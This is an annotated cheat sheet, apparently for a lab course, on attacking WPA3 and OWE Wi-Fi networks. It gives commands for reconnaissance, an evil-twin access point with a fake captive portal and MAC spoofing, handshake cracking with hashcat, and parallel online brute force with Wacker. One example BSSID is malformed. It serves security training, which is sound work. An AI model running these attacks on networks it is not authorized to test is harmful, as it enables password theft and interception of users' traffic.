# Attacking WPA3 Wi-Fi Networks

> ⚠️ **Ethical & legal note:** The following commands are for **authorized security testing and lab environments only**. Never attack networks you do not own or have explicit written permission to test.

---

## 1. Reconnaissance (OWE & SAE)

### 1.1 Enable monitor mode

```bash
# Put the wlan0 wireless interface into monitor mode for packet capture
sudo airmon-ng start wlan0
```

**What it does (from the cheat sheet):**  
Sets the `wlan0` interface to monitor mode.

**Command breakdown:**

- `sudo` – run the command with superuser/root privileges.
    
- `airmon-ng` – tool from the Aircrack-ng suite used to enable/disable monitor mode.
    
- `start` – tells `airmon-ng` to enable monitor mode.
    
- `wlan0` – the wireless network interface to reconfigure into monitor mode.
    

---

### 1.2 Scan for nearby access points

```bash
# Scan for nearby Wi-Fi access points using the monitor-mode interface
sudo airodump-ng wlan0mon
```

**What it does (from the cheat sheet):**  
Scans for nearby access points.

**Command breakdown:**

- `sudo` – run with root privileges (required for raw 802.11 capture).
    
- `airodump-ng` – packet capture tool for 802.11 networks (discovers APs and clients).
    
- `wlan0mon` – the monitor-mode interface created by `airmon-ng` (name may vary on your system).
    

---

### 1.3 Targeted capture of a specific BSSID (OWE)

```bash
# Capture traffic from a specific AP (BSSID) on channel 1 and save it to OWE-01.* capture files
sudo airodump-ng --bssid a6:89:f8:b8:78 -c 1 -w OWE
```

**What it does (from the cheat sheet):**  
Scans a specific BSSID on channel 1 and saves the results to `OWE-01.*`.

**Command breakdown:**

- `sudo` – run with root privileges.
    
- `airodump-ng` – capture tool for wireless traffic.
    
- `--bssid a6:89:f8:b8:78` – target this exact access point MAC address (BSSID).
    
- `-c 1` – listen on Wi-Fi **channel 1** only.
    
- `-w OWE` – write capture files with the prefix `OWE` (e.g., `OWE-01.cap`, `OWE-01.csv`).
    
- _(Implicit)_ `wlan0mon` – usually you’d also specify the interface at the end, e.g. `... -w OWE wlan0mon`.
    

---

### 1.4 Open the OWE capture in Wireshark

```bash
# Open the OWE-01.cap capture file in Wireshark with elevated privileges
sudo -E wireshark OWE-01.cap
```

**What it does (from the cheat sheet):**  
Opens the `OWE-01.cap` capture file with Wireshark.

**Command breakdown:**

- `sudo` – run Wireshark with root privileges (often needed for live capture; for offline capture it’s just for convenience).
    
- `-E` – preserve the user’s environment variables when using `sudo`.
    
- `wireshark` – GUI protocol analyzer used to inspect `.cap` files.
    
- `OWE-01.cap` – the capture file output by `airodump-ng` that you want to analyze.
    

---

### 1.5 Wireshark filter: Beacon frames

```bash
# Wireshark display filter to show only Beacon frames
(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0x08)
```

**What it does (from the cheat sheet):**  
Wireshark filter to find **Beacon frames**.

**Expression breakdown:**

- `wlan.fc.type == 0` – match **management** frames (type 0).
    
- `&&` – logical AND; both conditions must be true.
    
- `wlan.fc.type_subtype == 0x08` – match frames with subtype `0x08`, which are **Beacon** frames.
    
- Together, the filter shows only 802.11 **Beacon** frames in the capture.
    

---

### 1.6 Wireshark filter: EAPOL + association request/response

```bash
# Wireshark display filter to show EAPOL frames and association request/response frames
eapol or ((wlan.fc.type == 0) && (wlan.fc.type_subtype == 0x00 or wlan.fc.type_subtype == 0x01))
```

**What it does (from the cheat sheet):**  
Wireshark filter to find **EAPOL frames** plus **association request/response frames**.

**Expression breakdown:**

- `eapol` – display any frames that Wireshark has decoded as EAPOL (802.1X key exchange).
    
- `or` – logical OR; show frames matching either left or right side.
    
- `(wlan.fc.type == 0)` – management frames.
    
- `wlan.fc.type_subtype == 0x00` – association **request** frames.
    
- `wlan.fc.type_subtype == 0x01` – association **response** frames.
    
- Overall: show **EAPOL** frames **or** management frames that are association request/response.
    

---

## 2. Evil Twins (OWE & SAE)

### 2.1 Start a rogue AP with hostapd

```bash
# Start a rogue Wi-Fi access point using hostapd and its configuration file
sudo hostapd hostapd.conf
```

**What it does (from the cheat sheet):**  
Starts a rogue AP with **hostapd**.

**Command breakdown:**

- `sudo` – run with root privileges.
    
- `hostapd` – userspace daemon to create and manage a Wi-Fi access point.
    
- `hostapd.conf` – configuration file defining SSID, security parameters, interface, etc.
    

---

### 2.2 Start a fake captive portal with Nagaw

```bash
# Launch a fake captive portal with Nagaw, forwarding traffic from wlan1 to wlan2
python2 nagaw.py -i wlan1 -o wlan2 -t demo
```

**What it does (from the cheat sheet):**  
Starts a fake captive portal with **Nagaw** and forwards incoming `wlan1` traffic to `wlan2`.

**Command breakdown:**

- `python2` – use Python 2 interpreter to run the script.
    
- `nagaw.py` – Nagaw captive portal script.
    
- `-i wlan1` – **input interface**: where victim traffic arrives (e.g., clients connecting to the rogue AP).
    
- `-o wlan2` – **output interface**: where intercepted traffic is forwarded.
    
- `-t demo` – use the `demo` template/theme or configuration for the portal (as defined by Nagaw).
    

---

### 2.3 Enable IP forwarding

```bash
# Enable IPv4 forwarding in the Linux kernel so the system routes packets between interfaces
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
```

**What it does (from the cheat sheet):**  
Enables IP forwarding.

**Command breakdown:**

- `sudo` – run with elevated privileges.
    
- `sh -c "..."` – run the given string as a shell command.
    
- `echo 1` – output the value `1`.
    
- `>` – redirect the output into the file.
    
- `/proc/sys/net/ipv4/ip_forward` – virtual kernel parameter controlling IPv4 forwarding (0 = disabled, 1 = enabled).
    

---

### 2.4 Assign IP address to the rogue AP interface

```bash
# Assign a static IPv4 address and subnet mask to wlan1
sudo ifconfig wlan1 192.168.0.1/24
```

**What it does (from the cheat sheet):**  
Sets a valid IP address for `wlan1`.

**Command breakdown:**

- `sudo` – run with root privileges.
    
- `ifconfig` – legacy network interface configuration tool.
    
- `wlan1` – target wireless interface (AP side).
    
- `192.168.0.1/24` – assign IP `192.168.0.1` with a `/24` netmask (255.255.255.0).
    

---

### 2.5 Start DNS and DHCP with dnsmasq

```bash
# Start a combined DNS and DHCP server using dnsmasq and the given config
sudo dnsmasq -C dnsmasq.conf -d
```

**What it does (from the cheat sheet):**  
Launches a DNS and DHCP server with `dnsmasq`.

**Command breakdown:**

- `sudo` – run with root privileges.
    
- `dnsmasq` – lightweight DNS/DHCP server.
    
- `-C dnsmasq.conf` – use the configuration file `dnsmasq.conf` instead of defaults.
    
- `-d` – run in the foreground (do not daemonize), useful for debugging/logs.
    

---

### 2.6 Bring down the interface

```bash
# Temporarily shut down the wlan1 interface
sudo ifconfig wlan1 down
```

**What it does (from the cheat sheet):**  
Shuts down the `wlan1` interface.

**Command breakdown:**

- `sudo` – elevated privileges.
    
- `ifconfig` – network interface tool.
    
- `wlan1` – target interface.
    
- `down` – set the interface state to **down** (disabled).
    

---

### 2.7 Spoof the MAC address (wlan1)

```bash
# Spoof/change the MAC address of wlan1 to D8:D6:3D:EB:29:D5
sudo macchanger -m D8:D6:3D:EB:29:D5 wlan1
```

**What it does (from the cheat sheet):**  
Spoofs the MAC address of the `wlan1` interface.

**Command breakdown:**

- `sudo` – run as root.
    
- `macchanger` – tool for changing MAC addresses.
    
- `-m D8:D6:3D:EB:29:D5` – explicitly set the MAC address to this value.
    
- `wlan1` – the interface whose MAC address is being changed.
    

---

### 2.8 Bring the interface back up

```bash
# Bring the wlan1 interface back up after configuration/MAC changes
sudo ifconfig wlan1 up
```

**What it does (from the cheat sheet):**  
Starts up the `wlan1` interface.

**Command breakdown:**

- `sudo` – elevated privileges.
    
- `ifconfig` – interface configuration command.
    
- `wlan1` – target interface.
    
- `up` – set the interface state to **up** (enabled).
    

---

### 2.9 Sniff traffic on wlan1 and save to file

```bash
# Capture all traffic on wlan1 and write it to HTB.cap
sudo tcpdump -i wlan1 -w HTB.cap
```

**What it does (from the cheat sheet):**  
Sniffs the traffic on `wlan1` and outputs the capture file to `HTB.cap`.

**Command breakdown:**

- `sudo` – run as root.
    
- `tcpdump` – command-line packet sniffer.
    
- `-i wlan1` – capture on interface `wlan1`.
    
- `-w HTB.cap` – write raw packets to file `HTB.cap` (pcap format).
    

---

## 3. Bruteforcing (Online & Offline)

### 3.1 Check if a captured WPA handshake is valid

```bash
# Verify whether the WPA handshake in WPA-01.cap is valid using cowpatty
cowpatty -c -r WPA-01.cap
```

**What it does (from the cheat sheet):**  
Checks if a captured handshake is valid.

**Command breakdown:**

- `cowpatty` – WPA/WPA2 PSK cracking tool.
    
- `-c` – check the capture file for the presence of a complete handshake.
    
- `-r WPA-01.cap` – specify the capture file that contains the handshake.
    

---

### 3.2 Convert captured handshake to hash format

```bash
# Convert a captured WPA handshake from pcap to a hash format compatible with tools like hashcat
hcxpcapngtool -o hash WPA-01.cap
```

**What it does (from the cheat sheet):**  
Converts a captured handshake to a hash format.

**Command breakdown:**

- `hcxpcapngtool` – tool for converting pcap/pcapng captures to hash formats.
    
- `-o hash` – set the **output filename** to `hash` (the resulting hash file).
    
- `WPA-01.cap` – input capture file containing the handshake.
    

---

### 3.3 Crack WPA hash using hashcat

```bash
# Attempt to crack a WPA hash (mode 22000) using a wordlist with hashcat
hashcat -m 22000 hash /opt/wordlist.txt --force
```

**What it does (from the cheat sheet):**  
Cracks a WPA hash using `hashcat`.

**Command breakdown:**

- `hashcat` – GPU-accelerated password recovery tool.
    
- `-m 22000` – specify **hash mode 22000**, used for WPA-PBKDF2-PMKID/EAPOL (new hash format).
    
- `hash` – the input hash file produced by `hcxpcapngtool`.
    
- `/opt/wordlist.txt` – path to the password wordlist to try.
    
- `--force` – ignore some warnings and force hashcat to run (use with caution).
    

---

### 3.4 Split a wordlist into segments for Wacker

```bash
# Split a large wordlist into 4 smaller chunks for distributed bruteforcing with Wacker
bash split.sh 4 /opt/wordlist.txt
```

**What it does (from the cheat sheet):**  
Splits a wordlist into four segments for Wacker.

**Command breakdown:**

- `bash` – run the script using the Bash shell.
    
- `split.sh` – script that performs the splitting.
    
- `4` – number of segments to split the wordlist into.
    
- `/opt/wordlist.txt` – the original wordlist to be split.
    

---

### 3.5 Start online bruteforce with Wacker (wlan0, segment 1)

```bash
# Start an online WPA/WPA3 bruteforce with Wacker on wlan0 using the first wordlist segment
sudo python3 wacker.py --interface wlan0 --wordlist wordlist.txt.aaa --ssid HackMe --freq 2412 --bssid D8:D6:3D:EA:27:D3
```

**What it does (from the cheat sheet):**  
Starts online bruteforce using the **first** wordlist segment on `wlan0` with Wacker.

**Command breakdown:**

- `sudo` – run with elevated privileges.
    
- `python3` – run the script with Python 3.
    
- `wacker.py` – Wacker attack script.
    
- `--interface wlan0` – use `wlan0` as the attacking interface.
    
- `--wordlist wordlist.txt.aaa` – first wordlist segment created by `split.sh`.
    
- `--ssid HackMe` – target network SSID is `HackMe`.
    
- `--freq 2412` – frequency in MHz (2412 MHz is **channel 1** in 2.4 GHz band).
    
- `--bssid D8:D6:3D:EA:27:D3` – MAC address (BSSID) of the target AP.
    

---

### 3.6 Start online bruteforce with Wacker (wlan1, segment 2)

```bash
# Start an online WPA/WPA3 bruteforce with Wacker on wlan1 using the second wordlist segment
sudo python3 wacker.py --interface wlan1 --wordlist wordlist.txt.aab --ssid HackMe --freq 2412 --bssid D8:D6:3D:EA:27:D3
```

**What it does (from the cheat sheet):**  
Starts online bruteforce using the **second** wordlist segment on `wlan1` with Wacker.

**Command breakdown:**

- `sudo` – elevated privileges.
    
- `python3` – Python 3 interpreter.
    
- `wacker.py` – attack script.
    
- `--interface wlan1` – use `wlan1` interface.
    
- `--wordlist wordlist.txt.aab` – second chunk of the wordlist.
    
- `--ssid HackMe` – target SSID.
    
- `--freq 2412` – operating frequency (channel 1).
    
- `--bssid D8:D6:3D:EA:27:D3` – target AP BSSID.
    

---

### 3.7 Start online bruteforce with Wacker (wlan2, segment 3)

```bash
# Start an online WPA/WPA3 bruteforce with Wacker on wlan2 using the third wordlist segment
sudo python3 wacker.py --interface wlan2 --wordlist wordlist.txt.aac --ssid HackMe --freq 2412 --bssid D8:D6:3D:EA:27:D3
```

**What it does (from the cheat sheet):**  
Starts online bruteforce using the **third** wordlist segment on `wlan2` with Wacker.

**Command breakdown:**

- `sudo` – elevated privileges.
    
- `python3` – Python 3 interpreter.
    
- `wacker.py` – attack script.
    
- `--interface wlan2` – use `wlan2` interface.
    
- `--wordlist wordlist.txt.aac` – third chunk of the wordlist.
    
- `--ssid HackMe` – target network SSID.
    
- `--freq 2412` – frequency (channel 1).
    
- `--bssid D8:D6:3D:EA:27:D3` – BSSID of the target AP.
    

---

### 3.8 Start online bruteforce with Wacker (wlan3, segment 4)

```bash
# Start an online WPA/WPA3 bruteforce with Wacker on wlan3 using the fourth wordlist segment
sudo python3 wacker.py --interface wlan3 --wordlist wordlist.txt.aad --ssid HackMe --freq 2412 --bssid D8:D6:3D:EA:27:D3
```

**What it does (from the cheat sheet):**  
Starts online bruteforce using the **fourth** wordlist segment on `wlan3` with Wacker.

**Command breakdown:**

- `sudo` – elevated privileges.
    
- `python3` – Python 3 interpreter.
    
- `wacker.py` – attack script.
    
- `--interface wlan3` – use `wlan3` interface.
    
- `--wordlist wordlist.txt.aad` – fourth and final chunk of the wordlist.
    
- `--ssid HackMe` – target network SSID.
    
- `--freq 2412` – frequency (channel 1).
    
- `--bssid D8:D6:3D:EA:27:D3` – target AP MAC (BSSID).
    
